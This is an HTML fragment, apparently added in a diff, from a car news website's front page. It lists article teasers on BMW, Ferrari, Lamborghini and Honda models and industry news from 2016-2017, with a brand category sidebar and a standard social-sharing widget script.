+						<div class="mini-share-post">
+	<script>
+	window.___gcfg = {lang: 'en-US'};
+	(function(w, d, s) {
+	  function go(){
+		var js, fjs = d.getElementsByTagName(s)[0], load = function(url, id) {
+		  if (d.getElementById(id)) {return;}
+		  js = d.createElement(s); js.src = url; js.id = id;
+		  fjs.parentNode.insertBefore(js, fjs);
+		};
+		load('//connect.facebook.net/en/all.js#xfbml=1', 'fbjssdk');
+		load('https://apis.google.com/js/plusone.js', 'gplus1js');
+		load('//platform.twitter.com/widgets.js', 'tweetjs');
+	  }
+	  if (w.addEventListener) { w.addEventListener("load", go, false); }
+	  else if (w.attachEvent) { w.attachEvent("onload",go); }
+	}(window, document, 'script'));
+	</script>
+	<ul>			
+							</ul>
+	<div class="clear"></div>
+</div> <!-- .share-post -->						<div class="clear"></div>
+					</article><!-- .item-list -->
+												<div class="clear"></div>
+
+						</div><!-- .cat-box-content /-->
+		</section>
+				<div class="clear"></div>
+					<section class="cat-box column2 tie-cat-11 ">
+			<h2 class="cat-box-title"><a href="http://www.todayautosonline.com/category/car-reviews/bmw-reviews/">BMW Reviews</a></h2>
+			<div class="cat-box-content">
+			
+								<ul>
+													<li class="first-news">
+						<div class="inner-content">
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/bmws-x7-iperformance-concept-looks-like-three-rows-of-stunningly-luxurious-dog-crap/" title="Permalink to BMW’s X7 iPerformance Concept Looks Like Three Rows of Stunningly Luxurious Dog Crap" rel="bookmark">
+									<img width="300" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/778cd_P90274805_highRes-e1504878845405-610x376-300x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+											
+							<h2 class="post-box-title"><a href="http://www.todayautosonline.com/bmws-x7-iperformance-concept-looks-like-three-rows-of-stunningly-luxurious-dog-crap/" title="Permalink to BMW’s X7 iPerformance Concept Looks Like Three Rows of Stunningly Luxurious Dog Crap" rel="bookmark">BMW’s X7 iPerformance Concept Looks Like Three Rows of Stunningly Luxurious Dog Crap</a></h2>
+							<p class="post-meta">
+	
+		
+	<span class="tie-date">September 8, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/bmws-x7-iperformance-concept-looks-like-three-rows-of-stunningly-luxurious-dog-crap/#respond">Leave a comment</a></span>
+</p>
+							<div class="entry">
+								<p>BMW spent a good portion of this week ensuring the public that it is an ...</p>
+								<a class="more-link" href="http://www.todayautosonline.com/bmws-x7-iperformance-concept-looks-like-three-rows-of-stunningly-luxurious-dog-crap/">Read More &raquo;</a>
+							</div>
+						</div>
+					</li><!-- .first-news -->
+																		<li>
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/stop-the-presses-bmw-car-sales-rise-sav-sales-fall-in-august/" title="Permalink to Stop the Presses: BMW Car Sales Rise, SAV Sales Fall in August" rel="bookmark">
+									<img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/ead7e_All-new-2017-BMW-5-Series-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/09/ead7e_All-new-2017-BMW-5-Series-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/09/ead7e_All-new-2017-BMW-5-Series-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" />																	</a>
+							</div><!-- post-thumbnail /-->
+									
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/stop-the-presses-bmw-car-sales-rise-sav-sales-fall-in-august/" title="Permalink to Stop the Presses: BMW Car Sales Rise, SAV Sales Fall in August" rel="bookmark">Stop the Presses: BMW Car Sales Rise, SAV Sales Fall in August</a></h3>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">September 7, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/stop-the-presses-bmw-car-sales-rise-sav-sales-fall-in-august/#respond">Leave a comment</a></span>
+</p>
+					</li>
+																		<li>
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/rare-rides-the-1990-bmw-z1-a-little-bimmer-time-forgot/" title="Permalink to Rare Rides: The 1990 BMW Z1, a Little Bimmer Time Forgot" rel="bookmark">
+									<img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/08/3429b_00f0f_lhyR1wbxjUS_1200x900-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/08/3429b_00f0f_lhyR1wbxjUS_1200x900-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/08/3429b_00f0f_lhyR1wbxjUS_1200x900-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" />																	</a>
+							</div><!-- post-thumbnail /-->
+									
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/rare-rides-the-1990-bmw-z1-a-little-bimmer-time-forgot/" title="Permalink to Rare Rides: The 1990 BMW Z1, a Little Bimmer Time Forgot" rel="bookmark">Rare Rides: The 1990 BMW Z1, a Little Bimmer Time Forgot</a></h3>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">August 31, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/rare-rides-the-1990-bmw-z1-a-little-bimmer-time-forgot/#respond">Leave a comment</a></span>
+</p>
+					</li>
+																		<li>
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/rare-rides-the-1986-vixen-is-a-turbocharged-manual-bmw-powered-motorhome/" title="Permalink to Rare Rides: The 1986 Vixen is a Turbocharged, Manual, BMW-powered Motorhome" rel="bookmark">
+									<img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/08/3d28f_tiki-download_file-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/08/3d28f_tiki-download_file-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/08/3d28f_tiki-download_file-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" />																	</a>
+							</div><!-- post-thumbnail /-->
+									
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/rare-rides-the-1986-vixen-is-a-turbocharged-manual-bmw-powered-motorhome/" title="Permalink to Rare Rides: The 1986 Vixen is a Turbocharged, Manual, BMW-powered Motorhome" rel="bookmark">Rare Rides: The 1986 Vixen is a Turbocharged, Manual, BMW-powered Motorhome</a></h3>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">August 24, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/rare-rides-the-1986-vixen-is-a-turbocharged-manual-bmw-powered-motorhome/#respond">Leave a comment</a></span>
+</p>
+					</li>
+													</ul>
+
+							</div><!-- .cat-box-content /-->
+		</section> <!-- Two Columns -->
+		
+		
+		
+	
+					<section class="cat-box column2 tie-cat-19 last-column">
+			<h2 class="cat-box-title"><a href="http://www.todayautosonline.com/category/car-reviews/ferrari-reviews/">Ferrari Reviews</a></h2>
+			<div class="cat-box-content">
+			
+								<ul>
+													<li class="first-news">
+						<div class="inner-content">
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/ferrari-unveils-mischievous-replacement-for-entry-level-california/" title="Permalink to Ferrari Unveils Mischievous Replacement for ‘Entry-level’ California" rel="bookmark">
+									<img width="300" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2017/08/d9459_ferrariportofino03-300x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+											
+							<h2 class="post-box-title"><a href="http://www.todayautosonline.com/ferrari-unveils-mischievous-replacement-for-entry-level-california/" title="Permalink to Ferrari Unveils Mischievous Replacement for ‘Entry-level’ California" rel="bookmark">Ferrari Unveils Mischievous Replacement for ‘Entry-level’ California</a></h2>
+							<p class="post-meta">
+	
+		
+	<span class="tie-date">August 24, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/ferrari-unveils-mischievous-replacement-for-entry-level-california/#respond">Leave a comment</a></span>
+</p>
+							<div class="entry">
+								<p>Ferrari officially presented the world with theÂ car intended to replace the CaliforniaÂ on Wednesday. The new ...</p>
+								<a class="more-link" href="http://www.todayautosonline.com/ferrari-unveils-mischievous-replacement-for-entry-level-california/">Read More &raquo;</a>
+							</div>
+						</div>
+					</li><!-- .first-news -->
+																		<li>
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/ferrari-almost-certainly-yes-to-the-suv-probably-no-to-a-reincarnated-dino/" title="Permalink to Ferrari: Almost Certainly Yes to the SUV, Probably No to a Reincarnated Dino" rel="bookmark">
+									<img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/08/300c2_Ferrari-Dino-206-GT-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/08/300c2_Ferrari-Dino-206-GT-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/08/300c2_Ferrari-Dino-206-GT-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" />																	</a>
+							</div><!-- post-thumbnail /-->
+									
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/ferrari-almost-certainly-yes-to-the-suv-probably-no-to-a-reincarnated-dino/" title="Permalink to Ferrari: Almost Certainly Yes to the SUV, Probably No to a Reincarnated Dino" rel="bookmark">Ferrari: Almost Certainly Yes to the SUV, Probably No to a Reincarnated Dino</a></h3>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">August 11, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/ferrari-almost-certainly-yes-to-the-suv-probably-no-to-a-reincarnated-dino/#respond">Leave a comment</a></span>
+</p>
+					</li>
+																		<li>
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/ferrari-makes-no-bones-about-its-utility-vehicle-being-about-anything-other-than-money/" title="Permalink to Ferrari Makes No Bones About Its ‘Utility Vehicle’ Being About Anything Other Than Money" rel="bookmark">
+									<img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/08/fc6cf_ferrari-295560_1920-e1501699349932-610x435-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/08/fc6cf_ferrari-295560_1920-e1501699349932-610x435-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/08/fc6cf_ferrari-295560_1920-e1501699349932-610x435-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" />																	</a>
+							</div><!-- post-thumbnail /-->
+									
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/ferrari-makes-no-bones-about-its-utility-vehicle-being-about-anything-other-than-money/" title="Permalink to Ferrari Makes No Bones About Its ‘Utility Vehicle’ Being About Anything Other Than Money" rel="bookmark">Ferrari Makes No Bones About Its ‘Utility Vehicle’ Being About Anything Other Than Money</a></h3>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">August 3, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/ferrari-makes-no-bones-about-its-utility-vehicle-being-about-anything-other-than-money/#respond">Leave a comment</a></span>
+</p>
+					</li>
+																		<li>
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/report-2021-ferrari-f16x-will-be-ferraris-first-off-roader-suv-crossover-cuv-or-whatever-prancing-horse-designation-fits/" title="Permalink to Report: 2021 Ferrari F16X Will Be Ferrari’s First Off-Roader, SUV, Crossover, CUV, or Whatever Prancing Horse Designation Fits" rel="bookmark">
+									<img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/07/688c0_Original-Ferrari-factory-entrance-610x407-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/07/688c0_Original-Ferrari-factory-entrance-610x407-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/07/688c0_Original-Ferrari-factory-entrance-610x407-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" />																	</a>
+							</div><!-- post-thumbnail /-->
+									
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/report-2021-ferrari-f16x-will-be-ferraris-first-off-roader-suv-crossover-cuv-or-whatever-prancing-horse-designation-fits/" title="Permalink to Report: 2021 Ferrari F16X Will Be Ferrari’s First Off-Roader, SUV, Crossover, CUV, or Whatever Prancing Horse Designation Fits" rel="bookmark">Report: 2021 Ferrari F16X Will Be Ferrari’s First Off-Roader, SUV, Crossover, CUV, or Whatever Prancing Horse Designation Fits</a></h3>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">July 8, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/report-2021-ferrari-f16x-will-be-ferraris-first-off-roader-suv-crossover-cuv-or-whatever-prancing-horse-designation-fits/#respond">Leave a comment</a></span>
+</p>
+					</li>
+													</ul>
+
+							</div><!-- .cat-box-content /-->
+		</section> <!-- Two Columns -->
+		
+		
+		
+	
+					<section class="cat-box column2 tie-cat-29 ">
+			<h2 class="cat-box-title"><a href="http://www.todayautosonline.com/category/car-reviews/lamborghini-reviews/">Lamborghini Reviews</a></h2>
+			<div class="cat-box-content">
+			
+								<ul>
+													<li class="first-news">
+						<div class="inner-content">
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/former-lamborghini-boss-stephan-winkelmann-leaving-audi-sport-to-run-bugatti-in-2018/" title="Permalink to Former Lamborghini Boss Stephan Winkelmann Leaving Audi Sport to Run Bugatti in 2018" rel="bookmark">
+									<img width="300" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/319f7_Stephan-Winkelmann-Audi-RS5-300x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+											
+							<h2 class="post-box-title"><a href="http://www.todayautosonline.com/former-lamborghini-boss-stephan-winkelmann-leaving-audi-sport-to-run-bugatti-in-2018/" title="Permalink to Former Lamborghini Boss Stephan Winkelmann Leaving Audi Sport to Run Bugatti in 2018" rel="bookmark">Former Lamborghini Boss Stephan Winkelmann Leaving Audi Sport to Run Bugatti in 2018</a></h2>
+							<p class="post-meta">
+	
+		
+	<span class="tie-date">September 1, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/former-lamborghini-boss-stephan-winkelmann-leaving-audi-sport-to-run-bugatti-in-2018/#respond">Leave a comment</a></span>
+</p>
+							<div class="entry">
+								<p>According to a report in Autocar, the rise through Volkswagen Group ranks accomplished by Audi ...</p>
+								<a class="more-link" href="http://www.todayautosonline.com/former-lamborghini-boss-stephan-winkelmann-leaving-audi-sport-to-run-bugatti-in-2018/">Read More &raquo;</a>
+							</div>
+						</div>
+					</li><!-- .first-news -->
+																		<li>
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/not-wanting-owners-to-play-with-fire-lamborghini-recalls-5900-aventadors-all-venenos/" title="Permalink to Not Wanting Owners to Play with Fire, Lamborghini Recalls 5,900 Aventadors, All Venenos" rel="bookmark">
+									<img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/02/aac3b_lamborghini-veneno-5-610x343-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/02/aac3b_lamborghini-veneno-5-610x343-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/02/aac3b_lamborghini-veneno-5-610x343-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" />																	</a>
+							</div><!-- post-thumbnail /-->
+									
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/not-wanting-owners-to-play-with-fire-lamborghini-recalls-5900-aventadors-all-venenos/" title="Permalink to Not Wanting Owners to Play with Fire, Lamborghini Recalls 5,900 Aventadors, All Venenos" rel="bookmark">Not Wanting Owners to Play with Fire, Lamborghini Recalls 5,900 Aventadors, All Venenos</a></h3>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">February 15, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/not-wanting-owners-to-play-with-fire-lamborghini-recalls-5900-aventadors-all-venenos/#respond">Leave a comment</a></span>
+</p>
+					</li>
+																		<li>
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/vellum-venom-1985-lamborghini-countach-lp5000-qv/" title="Permalink to Vellum Venom: 1985 Lamborghini Countach LP5000 QV" rel="bookmark">
+									<img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2016/12/43e08_title-610x426-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2016/12/43e08_title-610x426-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2016/12/43e08_title-610x426-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" />																	</a>
+							</div><!-- post-thumbnail /-->
+									
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/vellum-venom-1985-lamborghini-countach-lp5000-qv/" title="Permalink to Vellum Venom: 1985 Lamborghini Countach LP5000 QV" rel="bookmark">Vellum Venom: 1985 Lamborghini Countach LP5000 QV</a></h3>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">December 29, 2016</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/vellum-venom-1985-lamborghini-countach-lp5000-qv/#respond">Leave a comment</a></span>
+</p>
+					</li>
+																		<li>
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/lamborghini-gallardo-se-review/" title="Permalink to Lamborghini Gallardo SE Review" rel="bookmark">
+									<img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/0eafd_30_copy_28-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+									
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/lamborghini-gallardo-se-review/" title="Permalink to Lamborghini Gallardo SE Review" rel="bookmark">Lamborghini Gallardo SE Review</a></h3>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">October 5, 2016</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/lamborghini-gallardo-se-review/#respond">Leave a comment</a></span>
+</p>
+					</li>
+													</ul>
+
+							</div><!-- .cat-box-content /-->
+		</section> <!-- Two Columns -->
+		
+		
+		
+	
+					<section class="cat-box column2 tie-cat-23 last-column">
+			<h2 class="cat-box-title"><a href="http://www.todayautosonline.com/category/car-reviews/honda-reviews/">Honda Reviews</a></h2>
+			<div class="cat-box-content">
+			
+								<ul>
+													<li class="first-news">
+						<div class="inner-content">
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/the-lost-decade-honda-exercises-hopeful-humility-and-acknowledges-mistakes-made/" title="Permalink to The Lost Decade: Honda Exercises Hopeful Humility and Acknowledges Mistakes Made" rel="bookmark">
+									<img width="300" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/02098_Adam_Levine_James_Valentine_with_M5_Civic-1-300x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+											
+							<h2 class="post-box-title"><a href="http://www.todayautosonline.com/the-lost-decade-honda-exercises-hopeful-humility-and-acknowledges-mistakes-made/" title="Permalink to The Lost Decade: Honda Exercises Hopeful Humility and Acknowledges Mistakes Made" rel="bookmark">The Lost Decade: Honda Exercises Hopeful Humility and Acknowledges Mistakes Made</a></h2>
+							<p class="post-meta">
+	
+		
+	<span class="tie-date">September 9, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/the-lost-decade-honda-exercises-hopeful-humility-and-acknowledges-mistakes-made/#respond">Leave a comment</a></span>
+</p>
+							<div class="entry">
+								<p>While Honda has a long and storied automotive history, it has lost much of its ...</p>
+								<a class="more-link" href="http://www.todayautosonline.com/the-lost-decade-honda-exercises-hopeful-humility-and-acknowledges-mistakes-made/">Read More &raquo;</a>
+							</div>
+						</div>
+					</li><!-- .first-news -->
+																		<li>
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/2017-honda-civic-type-r-first-drive-yeah-its-all-that/" title="Permalink to 2017 Honda Civic Type R First Drive – Yeah, It’s All That" rel="bookmark">
+									<img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/cbb06_DSC0114-Size-610-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/09/cbb06_DSC0114-Size-610-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/09/cbb06_DSC0114-Size-610-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" />																	</a>
+							</div><!-- post-thumbnail /-->
+									
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/2017-honda-civic-type-r-first-drive-yeah-its-all-that/" title="Permalink to 2017 Honda Civic Type R First Drive – Yeah, It’s All That" rel="bookmark">2017 Honda Civic Type R First Drive – Yeah, It’s All That</a></h3>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">September 7, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/2017-honda-civic-type-r-first-drive-yeah-its-all-that/#respond">Leave a comment</a></span>
+</p>
+					</li>
+																		<li>
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/no-thanks-to-the-new-honda-odyssey-u-s-minivan-sales-increased-in-august-2017-for-just-the-second-time-in-a-year/" title="Permalink to No Thanks to the New Honda Odyssey, U.S. Minivan Sales Increased In August 2017 for Just the Second Time in a Year" rel="bookmark">
+									<img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/ec13e_2018-Honda-Odyssey-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/09/ec13e_2018-Honda-Odyssey-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/09/ec13e_2018-Honda-Odyssey-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" />																	</a>
+							</div><!-- post-thumbnail /-->
+									
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/no-thanks-to-the-new-honda-odyssey-u-s-minivan-sales-increased-in-august-2017-for-just-the-second-time-in-a-year/" title="Permalink to No Thanks to the New Honda Odyssey, U.S. Minivan Sales Increased In August 2017 for Just the Second Time in a Year" rel="bookmark">No Thanks to the New Honda Odyssey, U.S. Minivan Sales Increased In August 2017 for Just the Second Time in a Year</a></h3>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">September 6, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/no-thanks-to-the-new-honda-odyssey-u-s-minivan-sales-increased-in-august-2017-for-just-the-second-time-in-a-year/#respond">Leave a comment</a></span>
+</p>
+					</li>
+																		<li>
+									
+							<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/priced-in-the-supercar-stratosphere-the-new-honda-nsx-is-hilariously-uncommon-in-australia/" title="Permalink to Priced in the Supercar Stratosphere, the New Honda NSX Is Hilariously Uncommon in Australia" rel="bookmark">
+									<img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/1e8c2_Honda-NSX-red-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/09/1e8c2_Honda-NSX-red-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/09/1e8c2_Honda-NSX-red-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" />																	</a>
+							</div><!-- post-thumbnail /-->
+									
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/priced-in-the-supercar-stratosphere-the-new-honda-nsx-is-hilariously-uncommon-in-australia/" title="Permalink to Priced in the Supercar Stratosphere, the New Honda NSX Is Hilariously Uncommon in Australia" rel="bookmark">Priced in the Supercar Stratosphere, the New Honda NSX Is Hilariously Uncommon in Australia</a></h3>
+						<p class="post-meta">
+	
+		
+	<span class="tie-date">September 1, 2017</span>	
+	
+	<span class="post-comments"><a href="http://www.todayautosonline.com/priced-in-the-supercar-stratosphere-the-new-honda-nsx-is-hilariously-uncommon-in-australia/#respond">Leave a comment</a></span>
+</p>
+					</li>
+													</ul>
+
+							</div><!-- .cat-box-content /-->
+		</section> <!-- Two Columns -->
+		
+		
+		
+	
+</div><!-- .content /-->
+
+<aside class="sidebar-narrow">
+<div id="categories-3" class="widget widget_categories"><div class="widget-top"><h4>Main Topics</h4><div class="stripe-line"></div></div>
+						<div class="widget-container">		<ul>
+	<li class="cat-item cat-item-6"><a href="http://www.todayautosonline.com/category/car-reviews/acura-reviews/" >Acura Reviews</a>
+</li>
+	<li class="cat-item cat-item-7"><a href="http://www.todayautosonline.com/category/car-reviews/alfa-romeo-reviews/" >Alfa Romeo Reviews</a>
+</li>
+	<li class="cat-item cat-item-8"><a href="http://www.todayautosonline.com/category/car-reviews/aston-martin-reviews/" >Aston Martin Reviews</a>
+</li>
+	<li class="cat-item cat-item-9"><a href="http://www.todayautosonline.com/category/car-reviews/audi-reviews/" >Audi Reviews</a>
+</li>
+	<li class="cat-item cat-item-2"><a href="http://www.todayautosonline.com/category/auto-insurance/" >Auto Insurance</a>
+</li>
+	<li class="cat-item cat-item-44"><a href="http://www.todayautosonline.com/category/auto-news/" >Auto News</a>
+</li>
+	<li class="cat-item cat-item-10"><a href="http://www.todayautosonline.com/category/car-reviews/bentley-reviews/" >Bentley Reviews</a>
+</li>
+	<li class="cat-item cat-item-11"><a href="http://www.todayautosonline.com/category/car-reviews/bmw-reviews/" >BMW Reviews</a>
+</li>
+	<li class="cat-item cat-item-12"><a href="http://www.todayautosonline.com/category/car-reviews/buick-reviews/" >Buick Reviews</a>
+</li>
+	<li class="cat-item cat-item-13"><a href="http://www.todayautosonline.com/category/car-reviews/cadillac-reviews/" >Cadillac Reviews</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://www.todayautosonline.com/category/car-buying/" >Car Buying</a>
+</li>
+	<li class="cat-item cat-item-3"><a href="http://www.todayautosonline.com/category/car-loans/" >Car Loans</a>
+</li>
+	<li class="cat-item cat-item-14"><a href="http://www.todayautosonline.com/category/car-reviews/chevrolet-reviews/" >Chevrolet Reviews</a>
+</li>
+	<li class="cat-item cat-item-15"><a href="http://www.todayautosonline.com/category/car-reviews/chrysler-reviews/" >Chrysler Reviews</a>
+</li>
+	<li class="cat-item cat-item-16"><a href="http://www.todayautosonline.com/category/car-reviews/daihatsu-reviews/" >Daihatsu Reviews</a>
+</li>
+	<li class="cat-item cat-item-17"><a href="http://www.todayautosonline.com/category/car-reviews/datsun-reviews/" >Datsun Reviews</a>
+</li>
+	<li class="cat-item cat-item-18"><a href="http://www.todayautosonline.com/category/car-reviews/dodge-reviews/" >Dodge Reviews</a>
+</li>
+	<li class="cat-item cat-item-19"><a href="http://www.todayautosonline.com/category/car-reviews/ferrari-reviews/" >Ferrari Reviews</a>
+</li>
+	<li class="cat-item cat-item-20"><a href="http://www.todayautosonline.com/category/car-reviews/fiat-reviews/" >Fiat Reviews</a>
+</li>
+	<li class="cat-item cat-item-21"><a href="http://www.todayautosonline.com/category/car-reviews/ford-reviews/" >Ford Reviews</a>
+</li>
+	<li class="cat-item cat-item-22"><a href="http://www.todayautosonline.com/category/car-reviews/gmc-reviews/" >GMC Reviews</a>
+</li>
+	<li class="cat-item cat-item-23"><a href="http://www.todayautosonline.com/category/car-reviews/honda-reviews/" >Honda Reviews</a>
+</li>
+	<li class="cat-item cat-item-24"><a href="http://www.todayautosonline.com/category/car-reviews/hyundai-reviews/" >Hyundai Reviews</a>
+</li>
+	<li class="cat-item cat-item-25"><a href="http://www.todayautosonline.com/category/car-reviews/isuzu-reviews/" >Isuzu Reviews</a>
+</li>
+	<li class="cat-item cat-item-26"><a href="http://www.todayautosonline.com/category/car-reviews/jaguar-reviews/" >Jaguar Reviews</a>
+</li>
+	<li class="cat-item cat-item-27"><a href="http://www.todayautosonline.com/category/car-reviews/jeep-reviews/" >Jeep Reviews</a>
+</li>
+	<li class="cat-item cat-item-28"><a href="http://www.todayautosonline.com/category/car-reviews/kia-reviews/" >Kia Reviews</a>
+</li>
+	<li class="cat-item cat-item-29"><a href="http://www.todayautosonline.com/category/car-reviews/lamborghini-reviews/" >Lamborghini Reviews</a>
+</li>
+	<li class="cat-item cat-item-30"><a href="http://www.todayautosonline.com/category/car-reviews/land-rover-reviews/" >Land Rover Reviews</a>
+</li>
+	<li class="cat-item cat-item-31"><a href="http://www.todayautosonline.com/category/car-reviews/mazda-reviews/" >Mazda Reviews</a>
+</li>
+	<li class="cat-item cat-item-32"><a href="http://www.todayautosonline.com/category/car-reviews/mercedes-benz-reviews/" >Mercedes-Benz Reviews</a>
+</li>
+	<li class="cat-item cat-item-33"><a href="http://www.todayautosonline.com/category/car-reviews/mitsubishi-reviews/" >Mitsubishi Reviews</a>
+</li>
+	<li class="cat-item cat-item-34"><a href="http://www.todayautosonline.com/category/car-reviews/nissan-reviews/" >Nissan Reviews</a>
+</li>
+	<li class="cat-item cat-item-35"><a href="http://www.todayautosonline.com/category/car-reviews/peugeot-reviews/" >Peugeot Reviews</a>
+</li>
+	<li class="cat-item cat-item-36"><a href="http://www.todayautosonline.com/category/car-reviews/porsche-reviews/" >Porsche Reviews</a>
+</li>
